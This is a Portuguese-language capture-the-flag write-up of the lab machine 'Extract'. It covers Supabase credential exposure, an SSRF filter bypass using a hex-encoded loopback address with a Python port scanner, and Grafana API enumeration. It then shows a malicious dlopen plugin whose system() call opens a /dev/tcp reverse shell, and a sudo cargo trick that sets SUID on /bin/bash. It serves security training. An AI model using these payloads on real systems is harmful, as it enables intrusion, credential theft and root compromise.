# Extract

![Extract](/images/hackingclub-extract/file-extract-2025-1.png)

## Sumário

A máquina apresenta inicialmente múltiplos serviços expostos à internet, incluindo uma instância do `Supabase` configurada de forma inadequada. Através desse serviço foi possível enumerar usuários e extrair credenciais completas (username, password e códigos de MFA), permitindo o acesso direto à aplicação principal após o crack dos hashes obtidos.

Dentro da aplicação, foi identificado um parâmetro que realizava uma verificação de disponibilidade de endpoints externos. Esse comportamento possibilitou a exploração de uma vulnerabilidade de `Server-Side Request Forgery (SSRF)`. Utilizando o SSRF, foi possível mapear serviços internos e descobrir uma instância do `Grafana` executando localmente, acessível apenas via loopback. A partir disso, explorou-se o Grafana para extrair dados de usuários internos, resultando em credenciais válidas para acesso via `SSH`.

Após o acesso, iniciou-se a movimentação lateral analisando um `binário` localizado em /opt, o qual carregava dinamicamente arquivos `.so` a partir de um diretório controlável. Criando um script malicioso, foi possível obter uma reverse shell como outro usuário do sistema.

Para a escalada de privilégios final, identificou-se que o usuário tinha permissão de sudo sobre o `binário do cargo`. Com isso, desenvolveu-se um script `Rust` capaz de modificar o bit SUID do /bin/bash, garantindo, assim, execução como root e controle total da máquina.

## Reconhecimento

### Varredura de portas

Utilizou-se o nmap para a varredura das 65.535 portas.

```bash
sudo nmap -Pn -sS -sV -p- extract.hc
```

**Resultado**

```
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http       Werkzeug/3.1.3 Python/3.12.3
54321/tcp open   api		Kong API Gateway 2.8.1
54322/tcp open   postgresql PostgreSQL DB 9.6.0 or later
54323/tcp open   supabase 	Supabase (Next.js painel / API)
54324/tcp open   http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
54327/tcp open   logflare	Logflare (logging platform)
```

## Explorando os serviços expostos

Ao acessar a porta 54323, foi possível identificar que o serviço exposto correspondia ao `Supabase`, incluindo seu painel e APIs internas. Durante a análise, verificou-se que o endpoint disponibilizava dados sensíveis utilizados pela aplicação principal.

![Supabase](/images/hackingclub-extract/file-extract-2025-2.png)

**Credenciais de acesso a aplicação principal**

- **Username** : `kenaz`
- **Email** : `kenaz@extract.hc`
- **Password** : `5f48e25cd07f81110f09ca56ef8bdb4d` - `dominican`
- **Token** : `678efbfe56af9e6f635f5b3630c826ee` - `00122`

## Explorando a vulnerabilidade

Após acessar a aplicação principal, identificamos uma funcionalidade responsável por verificar a disponibilidade de endpoints externos. Para validar a existência de uma vulnerabilidade de `SSRF (Server-Side Request Forgery)`, tentamos inicialmente realizar requisições direcionadas ao próprio host interno, utilizando localhost e o IP de loopback.

Quando o mecanismo de validação bloqueava esses formatos padrão, aplicamos uma payload convertendo o endereço IP para sua representação hexadecimal, permitindo bypassar as verificações e forçar o servidor a realizar requisições para o endereço interno desejado. Isso confirmou a exploração da vulnerabilidade SSRF e possibilitou o acesso a serviços locais não expostos externamente.

> ❌ SSRF (Server-Side Request Forgery) é uma vulnerabilidade em que um atacante consegue fazer com que o servidor envie requisições para endereços que ele normalmente não deveria acessar. Isso acontece quando a aplicação aceita um URL externo ou endpoint fornecido pelo usuário e tenta acessar esse endereço sem validação adequada. Com uma SSRF, o invasor pode: acessar serviços internos da rede que não são expostos à internet; ler dados sensíveis disponíveis apenas localmente (como painéis administrativos, APIs internas ou metadados de nuvem); em alguns casos, até realizar ações como varredura de portas internas ou obter credenciais.
{: .prompt-danger}


![Vulnerability SSRF](/images/hackingclub-extract/file-extract-2025-3.png)
![Bypass SSRF](/images/hackingclub-extract/file-extract-2025-4.png)

### Script para a varredura de portas no host interno

Para facilitar a varredura do host interno, desenvolvi um script multithread contendo 100 threads para inspecionar todas as 65.535 portas. O objetivo foi agilizar a identificação de serviços acessíveis por meio das respostas retornadas pelo servidor durante a exploração de SSRF.

```py
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

endpoint = "http://extract.hc/check"

headers = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "pt-BR,pt;q=0.9", 
    "Origin": "http://extract.hc", 
    "Content-Type": "application/x-www-form-urlencoded", 
    "Upgrade-Insecure-Requests": "1", 
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://extract.hc/", 
    "Accept-Encoding": "gzip, deflate, br", 
    "Cookie": "session=[SEU COOKIE]", 
    "Connection": "keep-alive"
}

def check_port(port):
    payload_url = f"http://0x7f000001:{port}"
    data = {"url": payload_url}

    try:
        response = requests.post(endpoint, headers=headers, data=data, timeout=1)

        if response.status_code == 200 and '<p class="subtitle">The endpoint is responding correctly</p>' in response.text:
            return port
    except:
        return None

def scan_fast():
    ports = range(1, 65535)
    valid_ports = []

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(check_port, port): port for port in ports}

        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"✅ Porta válida: {result}")
                valid_ports.append(result)

    print("\n🎯 Finalizado!")
    print(f"Portas encontradas: {valid_ports}")

if __name__ == "__main__":
    scan_fast()
```

> ⚠️ Lembre-se de alterar o seu cookie de sessão.
{: .prompt-warning}

## Grafana

Após realizar a varredura no host interno por meio da vulnerabilidade de SSRF, identificamos que o serviço `Grafana` estava exposto internamente na porta 3000. A partir disso, tornou-se possível enviar requisições diretamente para o serviço, utilizando o próprio servidor vulnerável como pivot.
Com esse acesso indireto, conseguimos consultar endpoints internos do Grafana que normalmente não seriam acessíveis externamente, permitindo a obtenção de informações privadas de usuários, incluindo dados vinculados a contas administrativas.

### Referência

- [Grafana Pentesting](https://hackviser.com/tactics/pentesting/services/grafana)

1 - Realizamos uma requisição ao endpoint `/api/search`, que é utilizado pelo próprio Grafana para listar os dashboards disponíveis. Essa consulta permitiu enumerar todos os dashboards existentes no ambiente, incluindo painéis privados que normalmente não seriam acessíveis externamente.  

```bash
http://0x7f000001:3000/api/search
```

**Resultado**

- **UID** : `private-users`

2 - Após identificar o UID dos dashboards privados, realizamos uma requisição ao endpoint `/api/dashboards/uid/[uid]`, permitindo enumerar todos os usuários vinculados a esses painéis.

```bash
http://0x7f000001:3000/api/dashboards/uid/private-users
```

![Grafana Dashboard](/images/hackingclub-extract/file-extract-2025-5.png)
![Grafana Users](/images/hackingclub-extract/file-extract-2025-6.png)

**Resultado**

- **User** : `bjorn`
- **Password** : `0d0589cd78709802a64a9a4580ae6789` - `007007`

## SSH

Após obter as credenciais de acesso SSH ao host, identificamos a existência de outro usuário, `astrid`. Com isso, podemos realizar movimentação lateral dentro do sistema para tentar obter acesso à conta desse usuário.

![SSH](/images/hackingclub-extract/file-extract-2025-7.png)
![Users Host](/images/hackingclub-extract/file-extract-2025-8.png)

## Ghidra

Ao verificar o diretório /opt, encontramos um binário `service_loader` criado pelo usuário root. Para analisá-lo com mais detalhe, transferimos o arquivo para a máquina local e utilizamos o Ghidra para inspecionar seu comportamento.

![Binário](/images/hackingclub-extract/file-extract-2025-9.png)

### Comportamento do binário

O binário atua como um carregador de plugins. Ele percorre o diretório `/opt/v2/plugins`, identifica arquivos válidos e monta o caminho completo de cada um deles. Para cada plugin encontrado, o programa tenta carregá-lo dinamicamente usando `dlopen()` e, caso o carregamento seja bem-sucedido, busca dentro da biblioteca a função `plugin_init`. Quando essa função existe, o binário a executa, permitindo que cada plugin inicialize sua própria lógica. Ao final, o programa continua percorrendo o diretório até que todos os plugins tenham sido processados. Abaixo, está a função main.

![Ghidra](/images/hackingclub-extract/file-extract-2025-10.png)

```bash
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined8        Stack[-0x30]:8 local_30                                XREF[2]:     001011ca(W), 
                                                                                                   00101292(R)  
             undefined8        Stack[-0x102   local_1020                              XREF[1]:     001011b1(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:001012d8(*), 00102060, 
                                                                                          00102100(*)  
        001011a0 f3 0f 1e fa     ENDBR64
        001011a4 41 55           PUSH       R13
        001011a6 41 54           PUSH       R12
        001011a8 55              PUSH       RBP
        001011a9 53              PUSH       RBX
        001011aa 48 81 ec        SUB        RSP,0x1000
                 00 10 00 00
        001011b1 48 83 0c        OR         qword ptr [RSP]=>local_1020,0x0
                 24 00
        001011b6 48 83 ec 18     SUB        RSP,0x18
        001011ba 48 8d 3d        LEA        RDI,[s_/opt/v2/plugins_00102004]                 = "/opt/v2/plugins"
                 43 0e 00 00
        001011c1 64 48 8b        MOV        RAX,qword ptr FS:[0x28]
                 04 25 28 
                 00 00 00
        001011ca 48 89 84        MOV        qword ptr [RSP + local_30],RAX
                 24 08 10 
                 00 00
        001011d2 31 c0           XOR        EAX,EAX
        001011d4 e8 17 ff        CALL       <EXTERNAL>::opendir                              DIR * opendir(char * __name)
                 ff ff
        001011d9 48 85 c0        TEST       RAX,RAX
        001011dc 0f 84 9e        JZ         main.cold
                 ff ff ff
        001011e2 48 89 c5        MOV        RBP,RAX
        001011e5 4c 8d 25        LEA        R12,[DAT_0010201c]                               = 2Eh    .
                 30 0e 00 00
        001011ec 0f 1f 40 00     NOP        dword ptr [RAX]
                             LAB_001011f0                                    XREF[5]:     00101211(j), 00101222(j), 
                                                                                          00101267(j), 00101278(j), 
                                                                                          00101280(j)  
        001011f0 48 89 ef        MOV        RDI,RBP
        001011f3 e8 58 ff        CALL       <EXTERNAL>::readdir                              dirent * readdir(DIR * __dirp)
                 ff ff
        001011f8 48 85 c0        TEST       RAX,RAX
        001011fb 0f 84 87        JZ         LAB_00101288
                 00 00 00
        00101201 48 8d 58 13     LEA        RBX,[RAX + 0x13]
        00101205 48 89 df        MOV        RDI,RBX
        00101208 e8 f3 fe        CALL       <EXTERNAL>::strlen                               size_t strlen(char * __s)
                 ff ff
        0010120d 48 83 f8 03     CMP        RAX,0x3
        00101211 76 dd           JBE        LAB_001011f0
        00101213 48 8d 7c        LEA        RDI,[RBX + RAX*0x1 + -0x3]
                 03 fd
        00101218 4c 89 e6        MOV        RSI=>DAT_0010201c,R12                            = 2Eh    .
        0010121b e8 10 ff        CALL       <EXTERNAL>::strcmp                               int strcmp(char * __s1, char * _
                 ff ff
        00101220 85 c0           TEST       EAX,EAX
        00101222 75 cc           JNZ        LAB_001011f0
        00101224 49 89 e5        MOV        R13,RSP
        00101227 48 83 ec 08     SUB        RSP,0x8
        0010122b b9 00 10        MOV        ECX,0x1000
                 00 00
        00101230 ba 02 00        MOV        EDX,0x2
                 00 00
        00101235 53              PUSH       RBX
        00101236 4c 8d 0d        LEA        R9,[s_/opt/v2/plugins_00102004]                  = "/opt/v2/plugins"
                 c7 0d 00 00
        0010123d be 00 10        MOV        ESI,0x1000
                 00 00
        00101242 4c 89 ef        MOV        RDI,R13
        00101245 4c 8d 05        LEA        R8,[s_%s/%s_00102020]                            = "%s/%s"
                 d4 0d 00 00
        0010124c e8 8f fe        CALL       <EXTERNAL>::__snprintf_chk                       undefined __snprintf_chk()
                 ff ff
        00101251 4c 89 ef        MOV        RDI,R13
        00101254 be 02 00        MOV        ESI,0x2
                 00 00
        00101259 e8 e2 fe        CALL       <EXTERNAL>::dlopen                               undefined dlopen()
                 ff ff
        0010125e 4c 89 ec        MOV        RSP,R13
        00101261 48 89 c7        MOV        RDI,RAX
        00101264 48 85 c0        TEST       RAX,RAX
        00101267 74 87           JZ         LAB_001011f0
        00101269 48 8d 35        LEA        RSI,[s_plugin_init_00102026]                     = "plugin_init"
                 b6 0d 00 00
        00101270 e8 fb fe        CALL       <EXTERNAL>::dlsym                                undefined dlsym()
                 ff ff
        00101275 48 85 c0        TEST       RAX,RAX
        00101278 0f 84 72        JZ         LAB_001011f0
                 ff ff ff
        0010127e ff d0           CALL       RAX
        00101280 e9 6b ff        JMP        LAB_001011f0
                 ff ff
        00101285 0f              ??         0Fh
        00101286 1f              ??         1Fh
        00101287 00              ??         00h
                             LAB_00101288                                    XREF[1]:     001011fb(j)  
        00101288 48 89 ef        MOV        RDI,RBP
        0010128b e8 90 fe        CALL       <EXTERNAL>::closedir                             int closedir(DIR * __dirp)
                 ff ff
        00101290 31 c0           XOR        EAX,EAX
                             LAB_00101292                                    XREF[1]:     main.cold:00101191(j)  
        00101292 48 8b 94        MOV        RDX,qword ptr [RSP + local_30]
                 24 08 10 
                 00 00
        0010129a 64 48 2b        SUB        RDX,qword ptr FS:[0x28]
                 14 25 28 
                 00 00 00
        001012a3 75 0e           JNZ        LAB_001012b3
        001012a5 48 81 c4        ADD        RSP,0x1018
                 18 10 00 00
        001012ac 5b              POP        RBX
        001012ad 5d              POP        RBP
        001012ae 41 5c           POP        R12
        001012b0 41 5d           POP        R13
        001012b2 c3              RET
                             LAB_001012b3                                    XREF[1]:     001012a3(j)  
        001012b3 e8 58 fe        CALL       <EXTERNAL>::__stack_chk_fail                     undefined __stack_chk_fail()
                 ff ff
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
        001012b8 0f              ??         0Fh
        001012b9 1f              ??         1Fh
        001012ba 84              ??         84h
        001012bb 00              ??         00h
        001012bc 00              ??         00h
        001012bd 00              ??         00h
        001012be 00              ??         00h
        001012bf 00              ??         00h
```

## Obtendo a shell do usuário`Astrid`

Para aproveitar o comportamento do binário, criamos um arquivo em `C` contendo a função `plugin_init`. Em seguida, compilamos o código diretamente dentro de `/opt/v2/plugins`, gerando um arquivo `.so` no local onde o binário realiza o `dlopen()`. Assim, quando o executável percorre o diretório e encontra o nosso plugin, ele carrega a biblioteca e executa automaticamente a função plugin_init, permitindo controlar o fluxo do programa.

1 - Primeiro criamos o código em C.

```bash
nano plugin.c
```

```c
#include <stdlib.h>

int plugin_init() {
    system("bash -c 'sh -i >& /dev/tcp/10.0.73.93/1337 0>&1'");
    return 0;
}
```

2 - Compilamos o arquivo direto na pasta /opt/v2/plugins.

```bash
gcc -shared -fPIC -o /opt/v2/plugins/plugin.so plugin.c
```

**Explicação**

- `-shared` → Gera um arquivo compartilhado (shared object), ou seja, uma biblioteca .so.
- `fPIC` → Gera código que pode ser carregado em qualquer posição da memória — requisito para bibliotecas compartilhadas .so.
- `-o /opt/v2/plugins/plugin.so` → Define o arquivo de saída. Nesse caso, o resultado da compilação será salvo como: /opt/v2/plugins/plugin.so.
- `plugin.c` → É o arquivo fonte em C que será compilado. 

> ⚠️ Lembre-se de escutar a porta localmente com o netcat.
{: .prompt-warning}

![Shell Astrid](/images/hackingclub-extract/file-extract-2025-11.png)

## Escalando privilégios para `root`

Com a shell do usuário astrid, executamos `sudo -l` e identificamos que ele possui permissão para executar o `cargo`, o compilador e gerenciador de pacotes da linguagem `Rust`, com privilégios elevados.

![Sudo](/images/hackingclub-extract/file-extract-2025-12.png)

1 - Criação do projeto Rust. 

```bash
mkdir privesc ; nano /privesc/Cargo.toml
```

```rust
[package]
name = "privesc"
version = "7.7.7"
edition = "2018"
```

**O que isso faz?**

- `mkdir privesc` cria um diretório para um projeto Rust.
- `Cargo.toml` define as metainformações do pacote, como: nome do projeto, versão, edição da linguagem Rust.
- Esse arquivo é essencial para que o cargo consiga compilar o projeto.

2 - Criação do arquivo-fonte principal.

```bash
mkdir privesc/src ; nano /privesc/src/main.rs
```

```rust
use std::process::Command;

fn main(){
    Command::new("chmod")
        .args(&["u+s", "/bin/bash"])
        .spawn()
        .unwrap();
}
```

**O que isso faz?**

- Cria o diretório `src`, onde ficam os arquivos-fonte em Rust.
- O arquivo `main.rs` contém o código executado pelo binário gerado.
- Utiliza a API `std::process::Command` para invocar um comando externo do sistema.
- Chama `chmod` com argumentos para alterar permissões do `/bin/bash`.
- `spawn()` inicia o processo e `unwrap()` faz o programa encerrar com erro caso a execução falhe.

3 - Executar o script em Rust.

```bash
cd privesc ; sudo /root/.cargo/bin/cargo run
```

4 - Executar o /bin/bash em modo preservado(Privilege Mode).

```bash
/bin/bash -p
```

![Root](/images/hackingclub-extract/file-extract-2025-13.png)